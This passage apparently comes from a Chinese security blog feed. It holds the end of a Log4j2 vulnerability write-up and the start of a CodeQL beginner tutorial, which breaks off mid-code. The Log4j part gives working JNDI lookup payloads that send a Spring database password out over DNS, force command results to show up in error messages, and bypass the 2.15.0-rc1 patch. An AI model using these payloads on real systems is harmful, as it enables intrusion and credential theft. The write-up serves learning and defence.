title="3. Bundle"></a>3. Bundle</h3><p>在浅蓝师傅的文章中提到的一种特殊<code>Lookup</code></p><p>源码的<code>BundleLookup</code>核心内容如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;    ...    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleName</span> <span class="operator">=</span> keys[<span class="number">0</span>];    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">bundleKey</span> <span class="operator">=</span> keys[<span class="number">1</span>];    ...    <span class="keyword">return</span> ResourceBundle.getBundle(bundleName).getString(bundleKey);&#125;</span><br></pre></td></tr></table></figure><p>在通常情况下这个<code>ResourceBundle</code>被用来做国际化，网站通常会给一段表述的内容翻译成多种语言</p><p>在<code>SpringBoot</code>下可能会获取到关键信息，将会比<code>Sys</code>和<code>Env</code>更严重</p><p>但这种情况略显鸡肋，需要手动排除<code>SpringBoot</code>自带的日志依赖并加入<code>Log4j2</code>的依赖（这种情况可能不多）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt;    &lt;exclusions&gt;        &lt;exclusion&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-starter-logging&lt;/artifactId&gt;        &lt;/exclusion&gt;    &lt;/exclusions&gt;&lt;/dependency&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-log4j2&lt;/artifactId&gt;&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>通过<code>$&#123;bundle:application:spring.datasource.password&#125;</code>可以直接拿到数据库密码，之后带入<code>DNSlog</code>，也可以使用</p><h3 id="4-DNS"><a href="#4-DNS" class="headerlink" title="4. DNS"></a>4. <code>DNS</code></h3><p><code>DNS</code>协议是属于<code>JNDI</code>协议的，所以我们也可以利用<code>DNS</code>协议来带一些信息</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317172023.png"></p><p>编写测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;<span class="keyword">import</span> org.apache.logging.log4j.Logger;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4jRce</span> &#123;    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger= LogManager.getLogger(log4jRce.class);    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;        logger.error(<span class="string">&quot;$&#123;jndi:dns://127.0.0.1:8888/$&#123;java:version&#125;&#125;&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><p>之后，使用 <code>nc -luvp</code>开启一个监听的端口</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317172551.png"></p><h3 id="5-不出网回显"><a href="#5-不出网回显" class="headerlink" title="5. 不出网回显"></a>5. 不出网回显</h3><p>在<code>log4j</code>整体流程下有这么一部</p><p>在<code>tryCallAppender</code>方法中<code>catch</code>了<code>RuntimeException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryCallAppender</span><span class="params">(<span class="keyword">final</span> LogEvent event)</span> &#123;    <span class="keyword">try</span> &#123;        appender.append(event);    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> RuntimeException error) &#123;        handleAppenderError(event, error);    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> Exception error) &#123;        handleAppenderError(event, <span class="keyword">new</span> <span class="title class_">AppenderLoggingException</span>(error));    &#125;&#125;</span><br></pre></td></tr></table></figure><p>如果配置了<code>ignoreExceptions</code>选项，就会直接抛出来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleAppenderError</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> RuntimeException ex)</span> &#123;    appender.getHandler().error(createErrorMsg(<span class="string">&quot;An exception occurred processing Appender &quot;</span>), event, ex);    <span class="keyword">if</span> (!appender.ignoreExceptions()) &#123;        <span class="keyword">throw</span> ex;    &#125;&#125;</span><br></pre></td></tr></table></figure><p>接下来，我们就要想办法去制造一个<code>RuntimeException</code></p><p>例如字符串转数字中有一个<code>NumberFormatException</code>异常，它父类的父类是<code>RuntimeException</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NumberFormatException</span> <span class="keyword">extends</span> <span class="title class_">IllegalArgumentException</span> &#123;&#125;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IllegalArgumentException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p><code>JndiManager.lookup</code>中name是<code>protocal://host:port/path</code></p><p>其中<code>port</code>本该是<code>int</code>如果给它无法转<code>int</code>的字符串就会抛出这里的信息</p><p>又联想到<code>$&#123;&#125;</code>是支持嵌套标签的，这里嵌入真正想要得到的结果，即可抛出执行结果</p><p>根据这个思路，成功在<code>Tomcat</code>项目中回显执行结果（例如这里的<code>$&#123;java:version&#125;</code>）</p><p>能够回显的Payload是这样：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//x.x.x.x:$&#123;java:version&#125;/xxx&#125;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220317182730.png"></p><p>浅蓝师傅的思路是来自于端口字符串强转<code>int</code>报错来回显</p><p>在<code>log4j2.xml</code>中开启配置：<code>ignoreExceptions=&quot;false&quot;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;warn&quot;</span> <span class="attr">name</span>=<span class="string">&quot;MyApp&quot;</span> <span class="attr">packages</span>=<span class="string">&quot;&quot;</span>&gt;</span>    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span>        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span> <span class="attr">ignoreExceptions</span>=<span class="string">&quot;false&quot;</span>&gt;</span>            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%m%n&quot;</span>/&gt;</span>        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span>    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span>        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span>            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT&quot;</span>/&gt;</span>        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span>    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在实际的环境中，有开启这个配置的概率，参考<code>apache</code>官方的描述</p><p>大致意思是在<code>FailoverAppender</code>情况下必须设置该选项为<code>false</code></p><p>某些情况下开发者想让错误报出来便于调试，也会故意开启这个选项</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ignoreExceptions:The <span class="keyword">default</span> is <span class="literal">true</span>, causing exceptions encountered <span class="keyword">while</span> appending events to be internally logged and then ignored. When set to <span class="literal">false</span> exceptions will be propagated to the caller, instead. You must set <span class="built_in">this</span> to <span class="literal">false</span> when wrapping <span class="built_in">this</span> Appender in a FailoverAppender.</span><br></pre></td></tr></table></figure><p>再<code>Tomcat</code>中使用<code>Log4j2</code>的配置文件需要修改<code>web.xml</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;    &lt;listener-class&gt;org.apache.logging.log4j.web.Log4jServletContextListener&lt;/listener-class&gt;&lt;/listener&gt;&lt;filter&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;filter-class&gt;org.apache.logging.log4j.web.Log4jServletFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;context-param&gt;    &lt;param-name&gt;log4jConfiguration&lt;/param-name&gt;    &lt;param-value&gt;file:<span class="comment">///YOUR_LOG4J2.XML_PATH&lt;/param-value&gt;&lt;/context-param&gt;&lt;filter-mapping&gt;    &lt;filter-name&gt;log4jServletFilter&lt;/filter-name&gt;    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;    &lt;dispatcher&gt;REQUEST&lt;/dispatcher&gt;    &lt;dispatcher&gt;FORWARD&lt;/dispatcher&gt;    &lt;dispatcher&gt;INCLUDE&lt;/dispatcher&gt;    &lt;dispatcher&gt;ERROR&lt;/dispatcher&gt;    &lt;dispatcher&gt;ASYNC&lt;/dispatcher&gt;&lt;/filter-mapping&gt;</span></span><br></pre></td></tr></table></figure><p>来个<code>Servlet</code>即可触发</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/test&quot;)</span><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();    <span class="meta">@Override</span>    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:$&#123;java:runtime&#125;/badClassName&#125;&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="RC1-修复绕过"><a href="#RC1-修复绕过" class="headerlink" title="RC1 修复绕过"></a>RC1 修复绕过</h2><p>修复版本<code>2.15.0-rc1</code></p><p>官方发布了补丁，就说是可以被绕过了，但是经过师傅们得分析，实际还是需要开启一些配置才能算绕过得</p><p>默认配置下是不能触发JNDI远程加载的，单就这个条件来说我觉得就很勉强了，但是确实更改了配置后就可以触发漏洞，</p><p>这里先鸽一下：说一下思路：</p><p>过滤了<code>RMI</code>，但是<code>LDAP</code>方式还是保留得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:<span class="comment">//xxx.xxx.xxx.xxx:xxxx/ ExportObject&#125;</span></span><br></pre></td></tr></table></figure><p>在url中“&#x2F;”后加上一个空格，就会导致lookup方法中一开始实例化URI对象的时候报错，这样不仅可以绕过第二道校验，连第一个针对host的校验也可以绕过，从而再次造成RCE。在rc2中，catch错误之后，return null，也就走不到lookup方法里了。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/10659">https://xz.aliyun.com/t/10659</a></p><p><a href="https://xz.aliyun.com/t/10649">https://xz.aliyun.com/t/10649</a></p><p><a href="https://www.anquanke.com/post/id/263325#h2-5">https://www.anquanke.com/post/id/263325#h2-5</a></p><p><a href="https://tttang.com/archive/1378/">https://tttang.com/archive/1378/</a></p>]]></content>
    
    
    <summary type="html">对学习log4j2当时得一些总结</summary>
    
    
    
    <category term="java安全" scheme="https://h0ld1rs.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java安全" scheme="https://h0ld1rs.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>codeql入门</title>
    <link href="https://h0ld1rs.github.io/posts/7090.html"/>
    <id>https://h0ld1rs.github.io/posts/7090.html</id>
    <published>2022-03-14T03:11:58.000Z</published>
    <updated>2022-03-15T10:27:29.737Z</updated>
    
    <content type="html"><![CDATA[<h1 id="codeql入门"><a href="#codeql入门" class="headerlink" title="codeql入门"></a>codeql入门</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最初接触codeql，是暑假公司师傅们提到了一下，当时在公司宿舍聊天，聊到各位师傅当时的面试题，，有一个师傅被问了AST语法树分析，，，</p><p>然后一脸懵逼的我听着师傅的讲解，谈到了2021 强网杯 那道几十万行的pop链，瞬间知道他是干啥的，，，</p><p>主要用于<code>污点追踪分析</code></p><p><img src="https://pic4.zhimg.com/80/v2-96aeb9524104f7c9abdcd4718f5759bb_720w.jpg" alt="img"></p><h2 id="Codeql基本概念"><a href="#Codeql基本概念" class="headerlink" title="Codeql基本概念"></a>Codeql基本概念</h2><h3 id="是什么"><a href="#是什么" class="headerlink" title="是什么"></a>是什么</h3><p>CodeQL是一个代码分析平台，在它的帮助下，安全研究人员可以利用已知的安全漏洞来挖掘类似的漏洞，可以实现变种分析的自动化。这里所谓的变种分析，就是以已知的安全漏洞作为参照物，在我们的目标代码中寻找类似的安全问题的过程。</p><h3 id="漏洞挖掘范式"><a href="#漏洞挖掘范式" class="headerlink" title="漏洞挖掘范式"></a>漏洞挖掘范式</h3><p>我们知道，挖掘漏洞的时候，对于大佬来说，其实是可以硬审的，但是，对安全人员要求比较高，换句话说，对新手不太友好，</p><p>那么，我们就可以照猫画虎去模仿的写一个类似的，去分析上面题到的变种类型。</p><h2 id="QL"><a href="#QL" class="headerlink" title="QL"></a>QL</h2><p>QL是一种通用的、面向对象的语言，可以用来查询任何类型的数据。在CodeQL平台上面，为了帮助安全研究人员完成各种代码分析工作，提供了许多现成的查询和代码库——这些都是使用QL语言编写的，</p><p>并且，它们都是开源的，源码可以从这里（<a href="https://github.com/semmle/ql%EF%BC%89%E4%B8%8B%E8%BD%BD%E3%80%82">https://github.com/semmle/ql）下载。</a></p><p>我们可以使用<code>mysql</code>去对比<code>codeql</code></p><ul><li>MySQL是一个数据库管理系统，可以用来存储、管理和分析数据；而CodeQL则可以看作是一个代码库管理系统，用于存储、管理和分析代码。</li><li>为了分析数据，我们需要SQL语言来查询数据库；而为了分析代码，这里则需要利用QL语言来查询代码库。</li></ul><p>&#x3D;&#x3D;CodeQL数据库中存放的是使用CodeQL创建和分析的关系数据。 我们可以将其看作是QL的快照，但是针对CodeQL工具进行了相应的优化处理。&#x3D;&#x3D;</p><h2 id="codeql的安装"><a href="#codeql的安装" class="headerlink" title="codeql的安装"></a>codeql的安装</h2><p>CodeQL主要分为引擎和库两部分，都可以在github上下载，核心的<code>解析引擎部分</code>是不开源的,用于解析数据库执行等操作，库是开源的，针对语言提供了很多函数和类型以方便我们写自己的规则。</p><ol><li><p>由于<code>CodeQL</code>的处理对象并不是源码本身，而是中间生成的AST结构数据库，所以我们先需要把我们的项目源码转换成<code>CodeQL</code>能够识别的<code>CodeDatabase</code>。这里先下载不开源的解析引擎</p><p>所以我们需要先下载codeql的客户端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/github/codeql-cli-binaries/releases</span><br></pre></td></tr></table></figure></li><li><p>需要下载一下QL库，但这里还有一种更为简单的方法，可以使用<code>vscode-codeql-starter</code>项目进行启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/github/vscode-codeql-starter</span><br></pre></td></tr></table></figure><p>由于其需要加载<code>ql库</code>，所以我们需要使用递归的方式下载</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --recursive https://github.com/github/vscode-codeql-starter</span><br></pre></td></tr></table></figure><p>主要是加载<code>submoudle</code></p><blockquote><p>简单来说就是一个模块引入了另一个子模块，所以才需要循环下载</p></blockquote></li></ol><p>这里遇到一些问题，就是版本的问题：ql的规则库和cli版本不对应，导致导入之后<code>ql</code>报错，和下图类似：</p><p><img src="https://user-images.githubusercontent.com/1850771/135095922-46fd4798-9dde-4191-80dc-1b73203e8fa8.png" alt="图片"></p><p>参考 issue :<a href="https://github.com/github/codeql/issues/6768">https://github.com/github/codeql/issues/6768</a></p><p>更换了 <code>codeql-cli</code>版本，我是更换到了<code>2.8.0</code>，此时最新版本是<code>2.8.3</code>，使用最新版本会报错。具体内容参考<code>issue</code></p><p>其实官方还提供了一个CodeQL的在线版本：<a href="https://lgtm.com/search">https://lgtm.com/search</a>  ， 可以使用</p><h2 id="一个练习codeql语法的github项目"><a href="#一个练习codeql语法的github项目" class="headerlink" title="一个练习codeql语法的github项目"></a>一个练习codeql语法的github项目</h2><p><a href="https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)">https://lab.github.com/githubtraining/codeql-u-boot-challenge-(cc++)</a></p><h2 id="codeql数据库操作"><a href="#codeql数据库操作" class="headerlink" title="codeql数据库操作"></a>codeql数据库操作</h2><p>需要先创建数据库</p><p><code>codeql database create &lt;database&gt; --language=&lt;language-identifier&gt; -source-root=&lt;path&gt; --command=&quot;mvn clean install --file pom.xml&quot;</code></p><blockquote><p>注意：如果省略<code>--command</code>参数，则 codeQL 会自动检测并使用自己的工具来构建。但还是强烈推荐使用自己自定义的参数，尤其是大项目时。</p></blockquote><p>更新数据库</p><p><code>codeql database upgrade &lt;path&gt;</code></p><p>对于建好的数据库，他的目录目录应该是如下的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- log/                # 输出的日志信息</span><br><span class="line">- db-java/            # 编译的数据库</span><br><span class="line">- src.zip             # 编译所对应的目标源码</span><br><span class="line">- codeql-database.yml # 数据库相关配置</span><br></pre></td></tr></table></figure><p>注意：</p><ol><li>对于非编译性的语言来说，直接扫描,像php，python等脚本语言可以不用编译</li><li>对于java这种语言来说，需要先经过编译。对于go来说，可编译也可不编译</li></ol><p>可以使用<code>codeql resolve languages</code>来看<code>codeql</code>支持哪些语言的版本</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220314114754.png"></p><h2 id="第一个codeql代码"><a href="#第一个codeql代码" class="headerlink" title="第一个codeql代码"></a>第一个codeql代码</h2><p>这里在<code>Vscode</code>上安装了对应的扩展，直接搜索<code>codeql</code>即可</p><p>测试代码样例：<a href="https://github.com/l4yn3/micro_service_seclab/">https://github.com/l4yn3/micro_service_seclab/</a></p><blockquote><p>其他项目：在 Github Learning Lab 中，有一个用于学习 CodeQL 的入门课程 - CodeQL U-Boot Challenge (C&#x2F;C++)]</p><p><a href="https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-%28cc++%29">https://lab.github.com/GitHubtraining/codeql-u-boot-challenge-%28cc++%29</a></p></blockquote><p>上面我们提到，我们需要使用codeql引擎，将需要分析的项目，转换成，可以被codeql识别的<code>database</code>，这个过程中，codeql引擎把我们的<code>java代码</code>转换成了可识别的<code>AST数据库</code>。</p><p>AST分析出来是这样子的(需要对单独的类进行分析)</p><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211206221432.png"></p><p>先导入qlpack.yml文件</p><p>这一步其实可以直接再<code>starter</code>里面写，但是也可以将<code>starter和 新的文件夹 加入工作区</code>，后者才需要导入<code>qlpack.yml</code></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">getting-started/codeql-extra-queries-java</span></span><br><span class="line"><span class="attr">version:</span> <span class="number">0.0</span><span class="number">.0</span></span><br><span class="line"><span class="attr">dependencies:</span></span><br><span class="line">  <span class="comment"># This uses the latest version of the codeql/java-all library.</span></span><br><span class="line">  <span class="comment"># You may want to change to a more precise semver string.</span></span><br><span class="line">  <span class="attr">codeql/java-all:</span> <span class="string">&quot;*&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">queries</span> <span class="attr">language</span>=<span class="string">&quot;java&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>之后进行一下测试，看看能不能进行查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;hello world&quot;;</span><br></pre></td></tr></table></figure><p>总的来说，QL的查询语句和<code>SQL</code>很像，类似如下结构：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i</span><br><span class="line"><span class="keyword">where</span> i <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> i</span><br></pre></td></tr></table></figure><ol><li>第一行表示，我们要引入<code>Codeql</code>的类库，因为我们要分析的项目是java的，所以在ql语句里，必不可少</li><li><code>from int i</code>：表示我们要定义一个变量 i ，他的类型是int，表示我们获取所有int类型的数据</li><li><code>where i = 1 表示当i等于1的时候，符合条件</code></li><li><code>select i </code>表示输出 i</li></ol><p>一句话总结就是：在所有的整形数字<code>i</code>中，当<code>i==1</code>的时候，惊奇输出</p><p>这样一来，我们就得到了QL查询的语法结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> [datatype] var</span><br><span class="line"><span class="keyword">where</span> <span class="keyword">condition</span>(var <span class="operator">=</span> something)</span><br><span class="line"><span class="keyword">select</span> var</span><br></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和sql一样，where部分的查询条件如果过长，会显得很乱。Codeql提供一种机制，可以把你很长的查询语句，封装成函数。</p><p>这个函数，就是谓词</p><blockquote><p>predicate 表示当前方法没有返回值。类似于 JAVA中的<code>void</code></p></blockquote><p>谓词方式定义如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">predicate name(type arg)</span><br><span class="line">&#123;</span><br><span class="line">  statements</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义谓词有三个要素：</p><ul><li>关键词 predicate（如果没有返回值），或者结果的类型（如果当前谓词内存在返回值）</li><li>谓词的名称</li><li>谓词的参数列表</li><li>谓词主体</li></ul><h4 id="1-无返回值的谓词"><a href="#1-无返回值的谓词" class="headerlink" title="1. 无返回值的谓词"></a>1. 无返回值的谓词</h4><ul><li>无返回值的谓词以<code>predicate</code>关键词开头。若传入的值满足谓词主体中的逻辑，则该谓词将保留该值。</li><li>无返回值谓词的使用范围较小，但仍然在某些情况下扮演了很重要的一个角色</li><li>举一个简单的例子</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">predicate isSmall(<span class="type">int</span> i) &#123;</span><br><span class="line">  i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> <span class="type">int</span> i </span><br><span class="line"><span class="keyword">where</span> isSmall(i) <span class="operator">/</span><span class="operator">/</span> 将整数集合i从正无穷大的数据集含，限制至 <span class="number">1</span><span class="number">-9</span></span><br><span class="line"><span class="keyword">select</span> i</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> 输出 <span class="number">1</span><span class="number">-9</span> 的数字</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220315144928.png"></p><p>若传入的 <code>i</code> 是小于 10 的正整数，则 <code>isSmall(i)</code> 将会使得传入的集合 <code>i</code> 只保留符合条件的值，其他值将会被舍弃。</p><h4 id="2-有返回值的谓词"><a href="#2-有返回值的谓词" class="headerlink" title="2. 有返回值的谓词"></a>2. 有返回值的谓词</h4><p>当需要将某些结果从谓词中返回时，与编程语言的 return 语句不同的是，谓词使用的是一个特殊变量 <code>result</code>。谓词主体的语法只是为了表述逻辑之间的关系，因此务必不要用一般编程语言的语法来理解。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> getSuccessor(<span class="type">int</span> i) &#123;</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> 若传入的 i 位于 <span class="number">1</span><span class="number">-9</span> 内，则返回 i<span class="operator">+</span><span class="number">1</span></span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">+</span> <span class="number">1</span> <span class="keyword">and</span> i <span class="keyword">in</span> [<span class="number">1</span> .. <span class="number">9</span>]</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">select</span> getSuccessor(<span class="number">3</span>)  <span class="operator">/</span><span class="operator">/</span> 输出<span class="number">4</span></span><br><span class="line"><span class="keyword">select</span> getSuccessor(<span class="number">33</span>) <span class="operator">/</span><span class="operator">/</span> 不输出任何信息</span><br></pre></td></tr></table></figure><p>在谓词主体中，<code>result</code> 变量可以像一般变量一样正常使用，唯一不同的是这个变量内的数据将会被返回。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">string getANeighbor(string country) &#123;</span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;France&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Germany&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Austria&quot;</span><br><span class="line">    <span class="keyword">or</span></span><br><span class="line">    country <span class="operator">=</span> &quot;Germany&quot; <span class="keyword">and</span> <span class="keyword">result</span> <span class="operator">=</span> &quot;Belgium&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> getANeighbor(&quot;France&quot;)</span><br></pre></td></tr></table></figure><p>这里会返回两个结果：”Belgium” 与 “Germany”</p><p>谓词不允许描述的数据集合个数<strong>不限于有限数量大小</strong>的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span> 该谓词将使得编译报错</span><br><span class="line"><span class="type">int</span> multiplyBy4(<span class="type">int</span> i) &#123;</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> i 是一个数据集合，此时该集合可能是「无限大小」</span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> <span class="keyword">result</span> 集合被设置为 i<span class="operator">*</span><span class="number">4</span>，意味着 <span class="keyword">result</span> 集合的大小有可能也是无限大小</span><br><span class="line">  <span class="keyword">result</span> <span class="operator">=</span> i <span class="operator">*</span> <span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但如果我们仍然需要定义这类函数，则必须<strong>限制集合数据大小</strong>，同时添加一个 <code>bindingset</code> 标注。该标注将会声明谓词 <code>plusOne</code> 所包含的数据集合是有限的，前提是 <code>i</code> 绑定到有限数量的数据集合。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 